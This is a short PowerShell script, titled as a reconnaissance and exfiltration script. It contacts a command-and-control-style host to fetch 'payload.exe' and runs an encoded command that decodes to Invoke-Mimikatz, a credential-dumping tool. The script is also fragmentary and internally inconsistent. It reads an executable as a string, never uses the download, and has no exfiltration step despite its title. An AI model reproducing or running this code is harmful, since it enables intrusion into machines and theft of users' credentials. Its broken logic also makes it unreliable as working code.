# PowerShell Reconnaissance & Exfiltration Script
$url = 'http://c2-command.dark-tunnel.net/payload.exe'
$webclient = New-Object System.Net.WebClient
$webclient.DownloadString($url)
powershell.exe -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA
# wscript.shell execution probe
